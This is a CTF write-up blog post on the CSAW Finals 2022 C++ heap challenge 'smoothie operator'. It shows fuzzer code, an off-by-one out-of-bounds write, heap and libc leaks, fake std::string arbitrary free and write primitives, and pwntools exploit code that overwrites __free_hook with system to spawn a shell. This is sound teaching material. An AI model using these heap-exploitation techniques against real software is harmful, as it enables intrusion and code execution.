---
title: pwn / smoothie operator - CSAW Finals 2022
layout: post
permalink: /2022/csaw-finals-smoothie/
description: ""
---

This was a C++ heap challenge I solved during CSAW finals, which I played with PPP. I believe the challenge had 3 (?) solves, but the challenges are hidden now so I can't double-check.

The challenge
=====

When you run the program, you get a cool *11 option* menu:

```
Welcome to Smoothie Operator, your favorite smoothie shop simulation game!
How do you win, you ask? You can't! You just play forever serving delicious food to your needy patrons!
Let's begin!


Please choose an action:

  1. Print queue
  2. Add order
  3. Edit order
  4. Prep order
  5. Serve order
  6. Cancel order
  7. Print complaints
  8. File complaint
  9. Resolve complaint
  10. Edit complaint
  11. Exit
  >
```

Already, we know it's going to be a heap challenge. But if you spend a few minutes interacting with the challenge, you'll find it's even more complicated than it appears:

- You can make three different types of orders (All of which let you enter the order number and price):
  - **Smoothie**: You can list up to 10 (arbitrary string) ingredients for your smoothie, and answer a few multiple-choice questions
  - **Monster**: Answer a bunch of 'would you like X?' and (if you say yes) 'how many X would you like' questions
  - **Pastry**: Answer a bunch of 'would you like X?' and (if you say yes) 'how many X would you like' questions
- You can move orders between 'states': Orders can be in state 'Ordered', 'Prepared', or 'Served'.
- Orders can be 'cancelled' (deleted) at any state.


Bugs everywhere
=========

It's not hard to find a bug in this program, but it's far from exploitable: 

```
Please choose an action:

  1. Print queue
  2. Add order
  3. Edit order
  4. Prep order
  5. Serve order
  6. Cancel order
  7. Print complaints
  8. File complaint
  9. Resolve complaint
  10. Edit complaint
  11. Exit
  > FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF

[ERROR] : please choice a valid option

Please choose an action:

  1. Print queue
  2. Add order
  3. Edit order
  4. Prep order
  5. Serve order
  6. Cancel order
  7. Print complaints
  8. File complaint
  9. Resolve complaint
  10. Edit complaint
  11. Exit
  > 1
*** stack smashing detected ***: terminated
Aborted
```

`menu()` is giving us a free, infinite-length write on the stack. I mean, if we had a canary and libc leak we'd be done, but we don't.

<img src="{% asset 'csawf/s1.png' @path %}" alt="" />

Finding useful bugs
=====

I'm expecting to find some heap corruption bug, so I tried entering garbage into pretty much every field and option imaginable, and couldn't find anything other than the above stack smashing bug. I got annoyed and decided to write a little fuzzer (no coverage, just literally picking a random option repeatedly until we hit a crash). I mean, there aren't *that* many options right?

I started with these (the functions `place_smoothie`, `prep`, `serve`, `cancel` do exactly what you'd expect):

```py
while True:
    # Pick from the options, unless we have no orders (in which case make an order)
    choice = random.randrange(4 if len(orders) > 0 else 1)

    # Pick an order, if necessary
    if choice != 0:
        # Pick an existing order to operate on
        order = random.choice(orders)
        print(str(order))


    if choice == 0:
        # Place smoothie order
        orders.append(place_smoothie())
        print(f"place {orders[-1]}")
    elif choice == 1:
        # Prep order
        prep(order)
        print(f"prep {order}")
    elif choice == 2:
        # Serve order
        serve(order)
        print(f"serve {order}")
    elif choice == 3:
        # Cancel order
        cancel(order)
        print(f"cancel {order}")
        orders.remove(order)
```

Ran it for a minute -- nothing. Added a few more:

```py
    elif choice == 4:
        # Create complaint (data is b"COMPLAINT" * 0x100)
        complain()
        complaint_count += 1
        print(f"complain {complaint_count}")
    elif choice == 5 and complaint_count > 0:
        # Resolve complaint
        resolve_complaint(random.randrange(complaint_count)+1)
        print(f"resolve {complaint_count+1}")
        complaint_count -= 1
    elif choice == 6 and complaint_count > 0:
        # Edit complaint
        edit_complaint(random.randrange(complaint_count)+1, "Z" * 0x2000)
        print(f"editcomplaint {complaint_count+1}")
```

Nothing. OK -- lets add the edit operation:

```py
def edit_order(order):
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(str(order))
    x = p.recvuntil("Editing")
    p.recvuntil("$")
    p.sendline("1.00")
    p.recvuntil("Enter up to")
    p.sendline("0")
    p.recvuntil("Large")
    p.sendline("1")
    p.recvuntil("Protein")
    p.sendline("1")
    p.recvuntil("avocado")
    p.sendline(str(0x13371337))
```

Still nothing. So the state machine is not easily breakable... at least not with a "Smoothie" order. But we still haven't tried the other two order types ('Pastry' and 'Monster'). "Monster" just *sounds* suspicious, so lets try that. I modified the `place_order` operation in my script to generate a Monster with '5' of everything:

```py
def place_order():
    global order_id_counter
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("$")
    p.sendline("1.00")
    p.recvuntil("#")
    order_id = order_id_counter
    order_id_counter += 1
    p.sendline(str(order_id))
    for i in range(7):
        p.recvuntil("Would you like any")
        p.sendline("y")
        p.recvuntil("How many")
        p.sendline(str(5))

```

And I created an `edit_order` operation to always set flavor '0' to a new quantity (note: I picked 0 totally by chance, it was mostly an artifact of originally editing a 'smoothie' order, in which you have to send zero to end the list of ingredients):

```py
def edit_order(order):
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil(">")
    p.sendline(str(order))
    x = p.recvuntil("Editing")
    p.recvuntil("$")
    p.sendline("1.00")
    p.recvuntil("Choose an flavor to edit")
    p.sendline("0")
    p.recvuntil("new quantity")
    p.sendline(str(payload))

```

```py
    elif choice == 7:
        edit_order(order, 0xeeeeeeee)
        print(f"editorder {order}")
```

OK, lets run it. A few seconds later...

```py
...
place 9
place 10
cancel 9
prep 5
place 11
place 12
cancel 12
editorder 10
cancel 10
place 13
complain 1

[*] Switching to interactive mode
:
munmap_chunk(): invalid pointer
```

??? we win??

```
gef>  heap chunks
...
Chunk(addr=0x557e8017af90, size=0xeeeeeee8, flags=! PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)
    [0x0000557e8017af90     43 4f 4d 50 4c 41 49 4e 54 43 4f 4d 50 4c 41 49    COMPLAINTCOMPLAI]
...
```

The size field on the complaint chunk got overwritten?? By who?? There's only one place I'm writing the value 0xeeeeeeee, and that's when editing an order... so let's look a little closer at that. In `Monster::edit_params`:

```cpp
printf(format: "Choose an flavor to edit: ")
std::istream::operator>>(this: &std::cin, &var_20)
if (var_20 s>= 0) {
    var_20 = var_20 - 1
    if (7 s> var_20) {
        std::operator<<<std::char_traits<char> >(__out: &std::cout, __s: "Enter a new quantity: ")
        std::istream::operator>>(this: &std::cin, arg1 + ((sx.q(zx.d(var_20.b)) + 8) << 2) + 0xc)
    }
}
```

It reads in an integer for which flavor I'd like to edit, then it checks if it's greater than *or equal to* zero, then *subtracts 1* from it. The low byte of this is used to index into an array of 32-bit integers. Ah ha! Just as with all the other integers in the game, the options presented to the user start from 1, so they have to subtract one to get the real index... but they screwed up the bounds check. I got pretty lucky and happened to try index 0 in my naive fuzzer.

This gives us an OOB heap write! In particular, we can write a 4-byte value at `arg1 + (0xff + 8) * 4 + 0xc`, or `arg1 + 0x428`, where arg1 is any heap chunk containing a `Monster`.

Leaks
====

Since I'm not a fan of *(checks notes)* 20-bit brute force, we are going to need a leak. Spend enough time staring at the binary, and you'll out if you just create a `Monster` and enter 'n' each time when asked if you would like any of that type of monster... it will never 0 initialize any of those fields. All those uninitialized values are written out when you print the order queue.

Checking in on our heap bins...

```cpp
void*** rax_14 = operator new(sz: 0x40)
Pastry::Pastry(rax_14)
```

```cpp
rbx = operator new(sz: 0x48)
Monster::Monster(rbx)
```

Monsters and Pastries share a heap bin (0x50), so we can allocate a Pastry, free it, and then allocate a Monster and we'll get some leaked memory.

```
------- ORDER LIST ------

Order: #2
Type: Monster (TM)
Price: $1.00
State: Ordered
Order quantities:
Regular (gross): 22019
Ultra White: 583137976
Ultra Blue: 22019
Ultra Fiesta: 583137976
Ultra Black: 22019
Ultra Sunrise: 0
Ultra Violet: 0

-------------------------
```

Slap the 'Ultra White' and 'Ultra Blue' `uint32_t`'s together, and you'll get a cool heap leak:
```py
leak1 = leak[leak.index(b'White: '):]
leak2 = leak[leak.index(b'Blue: '):]
leak1 = leak1.split(b"\n")[0].split(b": ")[1].decode()
leak2 = leak2.split(b"\n")[0].split(b": ")[1].decode()
leak1, leak2 = int(leak1, 10), int(leak2, 10)
heap_leak = leak2 << 32 | leak1

>>> hex(heap_leak)
0x560322c1fab8
```

This should give us enough to get started on the actual exploit.

## Exploit

We have a heap leak and a OOB write that lets us write 4-bytes at a known offset (0x428) from a `Monster` chunk. Note that since malloc always returns 16-byte-aligned pointers, our OOB write will always write 4-bytes at an address that ends in 0x8.

The plan:

1. Develop a (reusable) arbitrary-free / arbitrary-write primitive
2. Leak a libc address
  - Construct a fake unsorted-bin-sized chunk inside a 'complaint'
  - Free it with the arbitrary-free primitive
  - Print out the complaint
3. Use the arbitrary-write to overwrite `_free_hook` with `system`

### Arbitrary-free / Arbitrary-write

There are a lot of objects floating around the heap, but if you stare long enough at the binary you'll find that some of them are more useful than others:

- The `std::vector<std::string>` that are kept by "Smoothie" orders to track ingredients are not-so-nice. In `std::string` the heap-allocated buffer is kept at offset 0x0, which we can't write to :(. (You could possibly get somewhere by overwriting the length, but I didn't try this.)
- The `std::vector<std::string*>` that contains the list of "complaint" strings, is much nicer. The vector itself is never free'd (though, it's backing memory *is* realloc-d as needed), and it's just a flat array of heap pointers.
- (There are lots of other objects you could potentially overwrite interesting pointers in, but I didn't try.)

If we can overwrite a pointer in the `std::vector<std::string*>`, we can then 'resolve' the bogus complaint and both the `std::string` and the backing memory it manages will be free'd. But in order to overwrite these pointers, we need to get a `Monster` allocated more-or-less adjacent to the vector's backing memory. We can do that by making a lot of complaints, until just before the vector is going to resize itself. Then we allocate our `Monster`. Then we make some more complaints and the vector will get resized and the new allocation will be just after our `Monster`:

```py
# Allocate until the vector gets reallocated (Exact value determined experimentally)
for _ in range(0x138// 8):
    complain_bytes(b"D" * 0x50)
    # place_order()

# This is the Monster that we will OOB write from
o = place_order()

# Fill up some space, since our OOB write is kindof far (0x428)
place_order()
place_order()

# Cause the vector to get reallocated
complain_bytes(b"Z" * 0x50)
complain_bytes(b"Z" * 0x50)

# Now complaint index 0x3f is where we have our arbitrary write
# ... we need to at least fill up that many complaints
print(f"Next index: {hex(complain_counter-2)} {hex(o)}")
for _ in range(complain_counter-1, 0x3f):
    complain_bytes(b"J" * 0x50)

# This complaint is at index 0x3f. Soon, we will overwrite
# this `std::string*` to point somewhere else...
victim_str = complain_bytes("K" * 0x50) # victim_str is 0x3f
```

Now, if we can make fake `std::string`s, we can use them to get both arbitrary free and arbitrary write:
```py
# Structure of `std::string`:
# 0x0: pointer to buffer
# 0x8: length
# 0x10-0x18: ??? idc

# Length can be pretty much anything, it just needs to be big enough
# so it's above the 'inline string optimization' threshold
fake_str = p64(addr_to_free_or_write) + p64(0x40) + p64(0x0)

# Since we have a heap leak, we can compute the address of our fake string...
fake_str_addr = heap_leak + 0x...
edit_order(o, fake_str_addr & 0xffffffff) # Overwrite low 4-bytes of the std::string* at complaints[victim_str]

# Option 1: Free addr_to_free_or_write
# (note: this will also free fake_str)
resolve_complaint(victim_str)

# Option 2: Arbitrary write at addr_to_free_or_write
edit_complaint(victim_str, b"ABCDEFGHIJKMNOPQRSTUVWXYZ")
```

### Libc leak

I will use the fact that when you free a unsorted-bin-sized chunk, the first 8 bytes of
the free'd chunk will contain a libc address.

The plan:
- Construct a fake unsorted-bin-sized chunk inside a 'complaint'
- Free it with the arbitrary-free primitive
- Print out the complaint

Let's construct some fake chunks:
```py
# Start with some padding...
complain_chunk_body = b"X" * 0x18

# For the first complaint, the fake std::string will point to
# a fake unsorted-bin chunk at (complain_chunk+0x40)
string1 = p64(complain_chunk + 0x40) + p64(0x1337) + p64(0x3771)

# The fake unsorted bin chunk
fake_unsorted_bin_chunk = p64(0x1001) + b"\x99" * 0xff8

# (complain_chunk + 0x18), string is at (complain_chunk + 0x20)
complain_chunk_body += p64(0x221) + string1

# (complain_chunk + 0x38), userdata for fake unsorted chunk is at (complain_chunk + 0x40)
complain_chunk_body += fake_unsorted_bin_chunk + p64(0x101) + b"\x88" * 0xf8 + p64(0x101)

# For the second complaint, the string will point to
# THE SAME fake unsorted-bin chunk at (complain_chunk+0x40)

# We need a second fake std::string pointing to the same place
# so that we can read from the free'd chunk to get the leak
string_chunk_off = len(complain_chunk_body)
complain_chunk_body += p64(complain_chunk+0x40) + p64(0x40) + p64(0x0)
complain_bytes(complain_chunk_body.ljust(0x1f000, b"\x00"))

# Write the address of the first fake std::string into the array
edit_order(o, (complain_chunk+0x20) & 0xffffffff)

# Free the std::string, and it's backing 'unsorted bin chunk'
resolve_complaint(victim_str)

# Write the address of the second fake std::string into the array
edit_order(o, (complain_chunk+string_chunk_off) & 0xffffffff)

# Now read out the leak! (It is complaint number 64)
p.sendline("7")

p.recvuntil(b"64: ")
libc_leak = p.recvline()
libc_leak = u64(libc_leak[:8])
print(hex(libc_leak))
```

(As I'm writing this, I realized I probably could have done this without constructing a fake unsorted-bin chunk, since I should just be able to make a large complaint and free that legitimate unsorted-bin chunk, and I'll already know where that chunk is since I have a heap leak. Still, I'll need a fake `std::string` pointing to the unsorted bin chunk.)

### Overwrite free hook

```py
# Compute system/free_hook addresses
system_addr = (0xffffffffffe656b0 + libc_leak) & 0xffffffffffffffff
free_hook_addr = (0xffffffffffe656b0 + libc_leak + 0x19cbb8) & 0xffffffffffffffff

p.recvuntil(b"Please choose")

# Construct a fake string, inside another complaint
new_complain_body = p64(free_hook_addr-0x8) + p64(0x40) + p64(0x40) + p64(0) + b"F" * 0x50
complain_bytes(new_complain_body)

# Compute the address of this new complaint containing a fake std::string
new_complain_addr = heap_leak + 0x....

# Arbitrary write
edit_order(o, (new_complain_addr) & 0xffffffff)
edit_complaint(64, p64(0xbbbbbbbbbbbbbbbb) + p64(system_addr))
```

Now, we just need to get a chunk free'd containing `/bin/sh`. We have to be slightly creative to get around the short-string optimization (short strings get stored inline and don't get an allocation).
```py
p.recvuntil("Please choose")
p.sendline("8")
p.recvuntil("complaint")
p.sendline("////////////////bin/sh\x00'")

# Turns out, we don't even have to free it, somebody is doing a realloc or something
# and it gets free'd immediately

p.interactive()
```
And that gave me a shell...

Unfortunately, I didn't save the flag and infra has been taken down, so I don't have it here 🥲. I do remember the flag mentioned shared pointers, which I, uh, didn't use.

You can find my full exploit (and some of the 'fuzzer' code) [here](https://github.com/ndrewh/ctf/blob/master/csaw_f_2022/smoothie.py)

What was intended??
=====

I don't actually know how much of this was intended. There was a highly suspicious leak that I simply didn't use (And given my final exploitation path, I don't see how it would have helped.). In both 'Prep' and 'Serve' we have:

```cpp
printf(format: "%ld\n", std::__shared_ptr<Order, (_Lock_policy)2>::use_count(&new_order_ptr))
```

This originally made me search for bugs in the state machine (it keeps `std::shared_ptr`s to the orders, so they can be referenced by an 'all orders' list, as well as lists for each state), but I didn't find any mistakes that could be exploited on their own. I didn't find anywhere they were constructing multiple `shared_ptr`s to the same object (like [this writeup](https://blog.scrt.ch/2017/01/27/exploiting-a-misused-c-shared-pointer-on-windows-10/) I found), or anything like that. Did I miss something?

